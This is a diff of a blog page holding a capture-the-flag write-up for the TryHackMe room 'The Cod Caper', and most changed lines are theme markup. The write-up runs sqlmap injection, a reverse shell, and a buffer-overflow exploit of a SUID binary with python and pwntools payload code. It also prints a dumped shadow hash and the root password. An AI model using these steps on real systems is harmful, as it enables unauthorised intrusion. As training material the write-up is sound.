@@ -1,15 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="dark-mode">
 <head>
 
+    <title>thecodcaper CTF | write-up</title>
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-
-    <title>thecodcaper CTF | write-up</title>
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css?v=8ba882e352" />
+    <style>
+        :root {
+            --button-bg-color: #ffffff;
+            --button-text-color: var(--color-darkgrey);
+        }
+    </style>
+
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css?v=7717a9b749" />
 
     <link rel="icon" href="../favicon.png" type="image/png" />
     <link rel="canonical" href="index.html" />
@@ -20,23 +26,23 @@
     <meta property="og:type" content="article" />
     <meta property="og:title" content="thecodcaper CTF | write-up" />
     <meta property="og:description" content="Hello everyone, today&#x27;s CTF is so impressive, not rated yet but from my little experience I can tell there&#x27;s no easy or hard challenge, it&#x27;s all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope" />
-    <meta property="og:url" content="https://fr33s0ul.tech/thecodca/" />
-    <meta property="og:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/pgn.png" />
+    <meta property="og:url" content="http://localhost:2368/thecodca/" />
+    <meta property="og:image" content="http://localhost:2368/content/images/2020/04/pgn.png" />
     <meta property="article:published_time" content="2020-04-14T18:52:00.000Z" />
-    <meta property="article:modified_time" content="2020-11-21T15:24:21.000Z" />
+    <meta property="article:modified_time" content="2022-03-24T15:36:59.000Z" />
     <meta property="article:tag" content="CTF" />
     
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="thecodcaper CTF | write-up" />
     <meta name="twitter:description" content="Hello everyone, today&#x27;s CTF is so impressive, not rated yet but from my little experience I can tell there&#x27;s no easy or hard challenge, it&#x27;s all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope" />
-    <meta name="twitter:url" content="https://fr33s0ul.tech/thecodca/" />
-    <meta name="twitter:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/pgn.png" />
+    <meta name="twitter:url" content="http://localhost:2368/thecodca/" />
+    <meta name="twitter:image" content="http://localhost:2368/content/images/2020/04/pgn.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="fr33s0ul" />
     <meta name="twitter:label2" content="Filed under" />
     <meta name="twitter:data2" content="CTF" />
-    <meta name="twitter:site" content="@fr3350u1" />
-    <meta name="twitter:creator" content="@fr33soul_" />
+    <meta name="twitter:site" content="@fr33s0ul_Ninja" />
+    <meta name="twitter:creator" content="@fr33s0ul_Ninja" />
     <meta property="og:image:width" content="725" />
     <meta property="og:image:height" content="465" />
     
@@ -47,10 +53,10 @@
     "publisher": {
         "@type": "Organization",
         "name": "fr33s0ul",
-        "url": "https://fr33s0ul.tech/",
+        "url": "http://localhost:2368/",
         "logo": {
             "@type": "ImageObject",
-            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/logo.gif",
+            "url": "http://localhost:2368/content/images/2020/03/logo.gif",
             "width": 300,
             "height": 41
         }
@@ -60,22 +66,22 @@
         "name": "fr33s0ul",
         "image": {
             "@type": "ImageObject",
-            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/asdasd.gif",
+            "url": "http://localhost:2368/content/images/2020/03/asdasd.gif",
             "width": 600,
             "height": 594
         },
-        "url": "https://fr33s0ul.tech/author/fr33s0ul/",
+        "url": "http://localhost:2368/author/fr33s0ul/",
         "sameAs": [
-            "https://twitter.com/fr33soul_"
+            "https://twitter.com/fr33s0ul_Ninja"
         ]
     },
     "headline": "thecodcaper CTF | write-up",
-    "url": "https://fr33s0ul.tech/thecodca/",
+    "url": "http://localhost:2368/thecodca/",
     "datePublished": "2020-04-14T18:52:00.000Z",
-    "dateModified": "2020-11-21T15:24:21.000Z",
+    "dateModified": "2022-03-24T15:36:59.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/04/pgn.png",
+        "url": "http://localhost:2368/content/images/2020/04/pgn.png",
         "width": 725,
         "height": 465
     },
@@ -83,13 +89,16 @@
     "description": "Hello everyone, today&#x27;s CTF is so impressive, not rated yet but from my little\nexperience I can tell there&#x27;s no easy or hard challenge, it&#x27;s all about how\nout-of-the-box can you think. but no worries this one does have hints and the\ntechniques are provided with the questioner. anyways! hope you guys enjoy this\nwrite-up, Let&#x27;s enumerate machine!\n\n [https://giphy.com/gifs/cbs-306-seal306-seal-team-jVZmRHItLSlGE1SYBV]\n\nroot@kali:~# nmap -sV -sC 10.10.201.143\nStarting Nmap 7.80 ( https://nmap.org ) ",
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "https://fr33s0ul.tech/"
+        "@id": "http://localhost:2368/"
     }
 }
     </script>
 
-    <meta name="generator" content="Ghost 3.38" />
+    <meta name="generator" content="Ghost 4.41" />
     <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../rss/index.html" />
+    
+    <script defer src="../public/cards.min.js?v=7717a9b749"></script>
+    <link rel="stylesheet" type="text/css" href="../public/cards.min.css?v=7717a9b749">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-111725042-2"></script>
 <script>
@@ -99,23 +108,30 @@
 
   gtag('config', 'UA-111725042-2');
 </script>
+<!-- Go to www.addthis.com/dashboard to customize your tools -->
+<script type="text/javascript" src="http://s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5fc3b35649b48a82"></script>
+
+<style>:root {--ghost-accent-color: #15171A;}</style>
 
 </head>
 <body class="post-template tag-ctf">
+<div class="viewport">
 
-    <div class="site-wrapper">
+    <header id="gh-head" class="gh-head has-cover">
+        <nav class="gh-head-inner inner gh-container">
 
-        
-
-<header class="site-header">
-    <div class="outer site-nav-main">
-    <div class="inner">
-        <nav class="site-nav">
-    <div class="site-nav-left-wrapper">
-        <div class="site-nav-left">
-                <a class="site-nav-logo" href="../index.html"><img src="../content/images/size/w1000/2020/03/logo.gif" alt="fr33s0ul" /></a>
-            <div class="site-nav-content">
-                    <ul class="nav">
+            <div class="gh-head-brand">
+                <a class="gh-head-logo" href="../index.html">
+                        <img src="../content/images/size/w600/2020/03/logo.gif" alt="fr33s0ul" />
+                </a>
+                <a class="gh-burger" role="button">
+                    <div class="gh-burger-box">
+                        <div class="gh-burger-inner"></div>
+                    </div>
+                </a>
+            </div>
+            <div class="gh-head-menu">
+                <ul class="nav">
     <li class="nav-home"><a href="../index.html">Home</a></li>
     <li class="nav-whoami"><a href="../whoami/index.html">whoami</a></li>
     <li class="nav-whispers"><a href="../whispers/index.html">Whispers</a></li>
@@ -123,94 +139,69 @@
     <li class="nav-ctf"><a href="../tag/ctf/index.html">CTF</a></li>
 </ul>
 
-                    <span class="nav-post-title ">thecodcaper CTF | write-up</span>
             </div>
-        </div>
-    </div>
-    <div class="site-nav-right">
-            <div class="social-links">
-                    <a class="social-link social-link-tw" href="https://twitter.com/fr3350u1" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+            <div class="gh-head-actions">
+                <div class="gh-social">
+                        <a class="gh-social-twitter" href="https://twitter.com/fr33s0ul_Ninja" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
 </a>
-            </div>
-                <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://fr33s0ul.tech/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
-</a>
-
-    </div>
-</nav>
-    </div>
-</div></header>
-
-
-<main id="site-main" class="site-main outer">
-    <div class="inner">
-
-        <article class="post-full post tag-ctf ">
-
-            <header class="post-full-header">
-
-                <section class="post-full-tags">
-                    <a href="../tag/ctf/index.html">CTF</a>
-                </section>
-
-                <h1 class="post-full-title">thecodcaper CTF | write-up</h1>
-
-
-                <div class="post-full-byline">
-
-                    <section class="post-full-byline-content">
-
-                        <ul class="author-list">
-                            <li class="author-list-item">
-
-                                <div class="author-card">
-                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" />
-                                    <div class="author-info">
-                                        <div class="bio">
-                                            <h2>fr33s0ul</h2>
-                                            <p>A humble person interested to technology since first 3 way handshake, Having one goal from all of this, Sharing knowledge for the sake of change to a better humanity.</p>
-                                            <p><a href="../author/fr33s0ul/index.html">More posts</a> by fr33s0ul.</p>
-                                        </div>
-                                    </div>
-                                </div>
-
-                                <a href="../author/fr33s0ul/index.html" class="author-avatar">
-                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" />
-                                </a>
-
-                            </li>
-                        </ul>
-
-                        <section class="post-full-byline-meta">
-                            <h4 class="author-name"><a href="../author/fr33s0ul/index.html">fr33s0ul</a></h4>
-                            <div class="byline-meta-content">
-                                <time class="byline-meta-date" datetime="2020-04-14">14 Apr 2020</time>
-                                <span class="byline-reading-time"><span class="bull">&bull;</span> 9 min read</span>
-                            </div>
-                        </section>
-
-                    </section>
-
-
                 </div>
-            </header>
 
-            <figure class="post-full-image">
+                    <a class="gh-head-button" href="index.html#/portal/signup" data-portal="signup">Subscribe</a>
+            </div>
+        </nav>
+    </header>
+
+    <div class="site-content">
+        
+
+
+
+<main id="site-main" class="site-main">
+    <article class="article post tag-ctf image-small">
+
+        <header class="article-header gh-canvas">
+
+            <section class="article-tag">
+                <a href="../tag/ctf/index.html">CTF</a>
+            </section>
+
+            <h1 class="article-title">thecodcaper CTF | write-up</h1>
+
+
+            <div class="article-byline">
+                <section class="article-byline-content">
+                    <ul class="author-list">
+                        <li class="author-list-item">
+                            <a href="../author/fr33s0ul/index.html" class="author-avatar">
+                                <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" />
+                            </a>
+                        </li>
+                    </ul>
+                    <div class="article-byline-meta">
+                        <h4 class="author-name"><a href="../author/fr33s0ul/index.html">fr33s0ul</a></h4>
+                        <div class="byline-meta-content">
+                            <time class="byline-meta-date" datetime="2020-04-14">Apr 14, 2020</time>
+                            <span class="byline-reading-time"><span class="bull">&bull;</span> 9 min read</span>
+                        </div>
+                    </div>
+                </section>
+            </div>
+
+            <figure class="article-image">
                 <img
                     srcset="../content/images/size/w300/2020/04/pgn.png 300w,
                            ../content/images/size/w600/2020/04/pgn.png 600w,
                           ../content/images/size/w1000/2020/04/pgn. png 1000w,
                          ../content/images/size/w2000/2020/04/pgn. png 2000w"
-                    sizes="(max-width: 800px) 400px,
-                        (max-width: 1170px) 1170px,
-                            2000px"
+                    sizes="(min-width: 1400px) 1400px, 92vw"
                     src="../content/images/size/w2000/2020/04/pgn.png"
                     alt="thecodcaper CTF | write-up"
                 />
             </figure>
+        </header>
 
-            <section class="post-full-content">
-                <div class="post-content">
-                    <p>Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope you guys enjoy this write-up, Let's enumerate machine!</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/jVZmRHItLSlGE1SYBV" width="480" height="273" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/cbs-306-seal306-seal-team-jVZmRHItLSlGE1SYBV"></a></p><!--kg-card-end: html--><pre><code>root@kali:~# nmap -sV -sC 10.10.201.143
+        <section class="gh-content gh-canvas">
+            <p>Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope you guys enjoy this write-up, Let's enumerate machine!</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/jVZmRHItLSlGE1SYBV" width="480" height="273" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/cbs-306-seal306-seal-team-jVZmRHItLSlGE1SYBV"></a></p><!--kg-card-end: html--><pre><code>root@kali:~# nmap -sV -sC 10.10.201.143
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 09:50 UTC
 Nmap scan report for ip-10-10-201-143.eu-west-1.compute.internal (10.10.201.143)
 Host is up (0.0018s latency).
@@ -254,7 +245,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2020/04/10 09:53:22 Finished
 ===============================================================
-root@kali:~#</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-10.56.10.png" class="kg-image" alt></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-10.57.37.png" class="kg-image" alt></figure><p>So what's happening is that we will try to do a SQL injection in the POST data, we saved the request from burp and passed it to sqlmap</p><pre><code>root@kali:~# sqlmap -r request.txt --dbs
+root@kali:~#</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-10.56.10.png" class="kg-image" alt loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-10.57.37.png" class="kg-image" alt loading="lazy"></figure><p>So what's happening is that we will try to do a SQL injection in the POST data, we saved the request from burp and passed it to sqlmap</p><pre><code>root@kali:~# sqlmap -r request.txt --dbs
         ___
        __H__                                                                        
  ___ ___["]_____ ___ ___  {1.4#stable}                                              
@@ -306,13 +297,13 @@ available databases [5]:
 [*] ending @ 10:02:28 /2020-04-10/
 
 root@kali:~# 
-</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-11.03.59.png" class="kg-image" alt></figure><p>and we logged in with the credentials we got from the SQL injection, but the fun doesn't end there, we have a command prompt interacting with user <strong>www-data</strong>, we definitely can do something about it.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-11.08.08.png" class="kg-image" alt></figure><p>after digging a little bit, I found the <strong>SSH</strong> private key to the user in the machine, thought why not! let's enter from the front door.</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/EsmlrgWNx5v0Y" width="480" height="433" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/what-whatever-shrug-EsmlrgWNx5v0Y"></a></p><!--kg-card-end: html--><figure class="kg-card kg-code-card"><pre><code>root@kali:~# vim id_rsa
+</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-11.03.59.png" class="kg-image" alt loading="lazy"></figure><p>and we logged in with the credentials we got from the SQL injection, but the fun doesn't end there, we have a command prompt interacting with user <strong>www-data</strong>, we definitely can do something about it.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-11.08.08.png" class="kg-image" alt loading="lazy"></figure><p>after digging a little bit, I found the <strong>SSH</strong> private key to the user in the machine, thought why not! let's enter from the front door.</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/EsmlrgWNx5v0Y" width="480" height="433" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/what-whatever-shrug-EsmlrgWNx5v0Y"></a></p><!--kg-card-end: html--><figure class="kg-card kg-code-card"><pre><code>root@kali:~# vim id_rsa
 root@kali:~# locate ssh2john
 /usr/share/john/ssh2john.py
 root@kali:~# /usr/share/john/ssh2john.py id_rsa 
 id_rsa has no password!
 root@kali:~# 
-</code></pre><figcaption>Great! no password 👌</figcaption></figure><p>But the issue here, when I tried to ssh to the machine, didn't let me in, it kept asking for the password, the next thing I thought about is a <strong>REVERSE SHELL</strong> from the command prompt!</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/yoJC2GnSClbPOkV0eA" width="480" height="401" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/excited-birthday-yeah-yoJC2GnSClbPOkV0eA"></a></p><!--kg-card-end: html--><p>so I managed to make a simple one with <strong>echo</strong> in the <strong>/tmp</strong> file, I managed to run it, and get a reverse shell from the user <strong>www-data</strong></p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-11.24.12.png" class="kg-image" alt></figure><p>I then did some enumeration for files that are running as root for our user, to see if we can escalate. I used <strong><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a></strong> which is the new version of <strong>LinEnum</strong>.</p><p>we found an interesting file called <strong>root</strong> in <strong>/opt/secret/</strong> and as explained by the CTF maker,<strong>"</strong> The SUID file we found seems to expect 32 characters of input, and then immediately exits. This seems to warrant further investigation. Luckily I was practicing binary exploitation back when I was using that PC, so I have tools preinstalled to examine. One of those tools is pwndbg, a plugin for GDB which allows you to better examine binary files.</p><p>Run <code>gdb /opt/secret/root</code> and you should see a screen similar to this</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-12.25.44.png" class="kg-image" alt></figure><p>This means that pwndbg has successfully been initialized. The next step is to test if anything happens when you send more then 32 characters. To do this type <code>r &lt; &lt;(cyclic 50)</code>, that command runs the program and provides 50 characters worth of "cyclic" input.</p><p>Cyclic input goes like this: "aaaaaaaabaaacaaadaaaeaaaf" etc. Because it's in this "cyclic" format, it allows us to better understand the control we have over certain registers, for reasons you are about to see.</p><p>Once you run that command you should see something similar to this screen</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-12.26.02.png" class="kg-image" alt></figure><p>Now this is where some knowledge of assembly helps. It seems that in this case we're able to overwrite EIP, which is known as the instruction pointer. The instruction pointer tells the program which bit of memory to execute next, which in an ideal case would have the program run normally. However, since we're able to overwrite it, we can theoretically execute any part of the program at any time. Recall the shell function from the source code, if we can overwrite EIP to point to the shell function, we can cause it to execute. This is also where the benefits of cyclic input show themselves. Recall that cyclic input goes in 4 character/byte sequences, meaning we're able to calculate exactly how many characters we need to provide before we can overwrite EIP. Luckily cyclic provides this functionality with the -l flag, running cyclic -l {fault address} will tell us exactly how many characters we need to provide we can overwrite EIP.</p><p>Running <code>cyclic -l 0x6161616c</code> outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.<br>That's all we needed for pre-explotation!</p><p>Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-12.26.18.png" class="kg-image" alt></figure><p>What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!<br>Note: Modern CPU architectures are "little endian" meaning bytes are backwards. For example "0x080484cb" would become "cb840408" We can use python to do this, as it allows a nice way of converting.</p><p>Method 1 - Manual conversion:<br><code>python -c 'print "A"*44 + "\xcb\x84\x04\x08"'</code> will output the payload we want, but it requires manually converting to little endian</p><p>Method 2 - Struct:<br><code>python -c 'import struct;print "A"*44 + struct.pack("&lt;I",0x080484cb")'</code><br>It requires importing a module but struct.pack allows us to automatically convert memory to little endian. <br>We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary<br><code>python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root</code><br>should provide you with this output.</p><pre><code>www-data@ubuntu:/opt/secret$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root    
+</code></pre><figcaption>Great! no password 👌</figcaption></figure><p>But the issue here, when I tried to ssh to the machine, didn't let me in, it kept asking for the password, the next thing I thought about is a <strong>REVERSE SHELL</strong> from the command prompt!</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/yoJC2GnSClbPOkV0eA" width="480" height="401" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/excited-birthday-yeah-yoJC2GnSClbPOkV0eA"></a></p><!--kg-card-end: html--><p>so I managed to make a simple one with <strong>echo</strong> in the <strong>/tmp</strong> file, I managed to run it, and get a reverse shell from the user <strong>www-data</strong></p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-11.24.12.png" class="kg-image" alt loading="lazy"></figure><p>I then did some enumeration for files that are running as root for our user, to see if we can escalate. I used <strong><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a></strong> which is the new version of <strong>LinEnum</strong>.</p><p>we found an interesting file called <strong>root</strong> in <strong>/opt/secret/</strong> and as explained by the CTF maker,<strong>"</strong> The SUID file we found seems to expect 32 characters of input, and then immediately exits. This seems to warrant further investigation. Luckily I was practicing binary exploitation back when I was using that PC, so I have tools preinstalled to examine. One of those tools is pwndbg, a plugin for GDB which allows you to better examine binary files.</p><p>Run <code>gdb /opt/secret/root</code> and you should see a screen similar to this</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-12.25.44.png" class="kg-image" alt loading="lazy"></figure><p>This means that pwndbg has successfully been initialized. The next step is to test if anything happens when you send more then 32 characters. To do this type <code>r &lt; &lt;(cyclic 50)</code>, that command runs the program and provides 50 characters worth of "cyclic" input.</p><p>Cyclic input goes like this: "aaaaaaaabaaacaaadaaaeaaaf" etc. Because it's in this "cyclic" format, it allows us to better understand the control we have over certain registers, for reasons you are about to see.</p><p>Once you run that command you should see something similar to this screen</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-12.26.02.png" class="kg-image" alt loading="lazy"></figure><p>Now this is where some knowledge of assembly helps. It seems that in this case we're able to overwrite EIP, which is known as the instruction pointer. The instruction pointer tells the program which bit of memory to execute next, which in an ideal case would have the program run normally. However, since we're able to overwrite it, we can theoretically execute any part of the program at any time. Recall the shell function from the source code, if we can overwrite EIP to point to the shell function, we can cause it to execute. This is also where the benefits of cyclic input show themselves. Recall that cyclic input goes in 4 character/byte sequences, meaning we're able to calculate exactly how many characters we need to provide before we can overwrite EIP. Luckily cyclic provides this functionality with the -l flag, running cyclic -l {fault address} will tell us exactly how many characters we need to provide we can overwrite EIP.</p><p>Running <code>cyclic -l 0x6161616c</code> outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.<br>That's all we needed for pre-explotation!</p><p>Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-12.26.18.png" class="kg-image" alt loading="lazy"></figure><p>What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!<br>Note: Modern CPU architectures are "little endian" meaning bytes are backwards. For example "0x080484cb" would become "cb840408" We can use python to do this, as it allows a nice way of converting.</p><p>Method 1 - Manual conversion:<br><code>python -c 'print "A"*44 + "\xcb\x84\x04\x08"'</code> will output the payload we want, but it requires manually converting to little endian</p><p>Method 2 - Struct:<br><code>python -c 'import struct;print "A"*44 + struct.pack("&lt;I",0x080484cb")'</code><br>It requires importing a module but struct.pack allows us to automatically convert memory to little endian. <br>We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary<br><code>python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root</code><br>should provide you with this output.</p><pre><code>www-data@ubuntu:/opt/secret$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root    
 &lt;$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root          
 root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
 daemon:*:17953:0:99999:7:::
@@ -347,270 +338,199 @@ su root
 Password: love2fish
 
 root@ubuntu:/opt/secret#id
-uid=0(root) gid=0(root) groups=0(root)</code></pre><p>Pwntools is a python library dedicated to making everything we just did in the last task much simpler. However, since it is a library, it requires python knowledge to use to it's full potential, and as such everything in this task will be done using a python script.<br>We start off the script with:</p><p><code>from pwn import *</code><br><code>proc = process('/opt/secret/root')</code></p><p>This imports all the utilities from the pwntools library so we can use them in our script, and then creates a process that we can interact with using pwntools functions.</p><p>We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF(). ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.<br>With the ELF addition our script becomes<br><code>from pwn import *</code><br><code>proc = process('/opt/secret/root')</code><br><code>elf = ELF('/opt/secret/root')</code><br><code>shell_func = elf.symbols.shell</code><br>shell_func holds the memory address of our shell function. Now we need a way to form the payload, luckily pwntools has that to with fit().</p><p>fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our <code>proc</code> variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.<br>With all that our final exploit script becomes<br><code>from pwn import *</code><br><code>proc = process('/opt/secret/root')</code><br><code>elf = ELF('/opt/secret/root')</code><br><code>shell_func = elf.symbols.shell</code><br><code>payload = fit({</code><br><code>44: shell_func # this adds the value of shell_func after 44 characters</code><br><code>})</code><br><code>proc.sendline(payload)</code><br><code>proc.interactive()</code><br>Save that to a .py file and run it, and you should get this output:</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-14-at-19.38.53.png" class="kg-image" alt></figure><p>Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is <code>$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.</code><strong>"</strong></p><p>Happy hacking!</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com/room/thecodcaper"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | The Cod Caper</div><div class="kg-bookmark-description">A guided room taking you through infiltrating and exploiting a Linux system.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png"><span class="kg-bookmark-publisher">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/282c55307eada4ad18a0b06e4d65ff34.jpeg"></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | Hacking Training</div><div class="kg-bookmark-description">An online platform for learning and teaching cyber security, all through your browser.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png"><span class="kg-bookmark-publisher">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://tryhackme.com/img/favicon.png"></div></a></figure><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/123GivAQB7k0s8" width="480" height="277" 